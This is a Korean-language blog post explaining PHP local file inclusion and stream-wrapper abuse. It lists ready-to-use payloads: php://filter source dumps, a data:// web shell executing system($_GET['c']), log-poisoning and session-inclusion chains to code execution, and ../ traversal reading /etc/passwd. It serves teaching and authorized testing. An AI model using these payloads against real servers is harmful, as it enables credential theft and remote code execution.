---
title: "PHP 파일 포함과 스트림 래퍼 (LFI)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, PHP]
tags: [php, lfi, rfi, stream-wrapper, web]
description: "include/require에 사용자 입력이 닿을 때 소스 노출·코드 실행으로 번지는 LFI의 개념과, php://filter·data·래퍼·로그 오염·세션 포함 구문을 정리합니다."
mermaid: true
---

> PHP의 `include`/`require`에 사용자 입력이 경로로 닿으면, 공격자는 임의 파일을 포함시켜 **소스 노출**부터 **코드 실행**까지 끌어낸다. 스트림 래퍼(`php://`, `data://`)가 이 영향을 키운다.

## 개념

`include($page)`는 지정 파일을 PHP로 해석해 실행한다. `$page`에 사용자 입력이 들어가면 경로 조작으로 다른 파일을 포함하거나, 래퍼를 이용해 소스를 읽거나 코드를 주입한다.

```php
include($_GET['page'] . ".php");   // page=../../../../etc/passwd%00  또는 php://filter...
```

`.php` 접미사가 붙어도 `%00`(구버전) 절단, 경로 조작, 래퍼로 우회된다. 원격 파일 포함(RFI)은 `allow_url_include`가 켜져야 하지만, LFI만으로도 로그·세션·업로드 파일을 포함해 실행으로 이어진다.

## 공격·우회 구문

허가된 범위에서만.

### 소스 노출 (php://filter)

PHP 소스를 Base64로 떠서 읽는다(실행하지 않고 내용 획득).

```
page=php://filter/convert.base64-encode/resource=config
page=php://filter/read=convert.base64-encode/resource=index
→ 응답의 Base64 디코딩 = 소스 (DB 자격증명 등)
```

### 코드 실행 (data·입력 래퍼)

```
page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+   # <?php system($_GET['c']);?>
page=php://input   + POST 본문에 <?php system('id');?>  (allow_url_include)
page=expect://id    (expect 확장 설치 시)
```

### LFI → RCE 연계

```
로그 오염: User-Agent 에 <?php system($_GET['c']);?> → page=/var/log/apache2/access.log
세션 포함: 입력이 세션에 저장되면 page=/var/lib/php/sessions/sess_<id>
업로드 연계: 이미지에 PHP 삽입 후 page=/path/to/upload.png
/proc/self/environ 에 UA 주입 후 포함 (구형)
```

### 경로·접미사 우회

```
../../../../etc/passwd          기본 경로 조작
....//....//etc/passwd          삭제형 치환
%00 (구버전), 경로 길이로 .php 밀어내기(path truncation, 구버전)
```

## 참고 자료

- [OWASP Testing for Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [PHP: Supported Protocols and Wrappers](https://www.php.net/manual/en/wrappers.php)
- [CWE-98: PHP Remote File Inclusion](https://cwe.mitre.org/data/definitions/98.html)
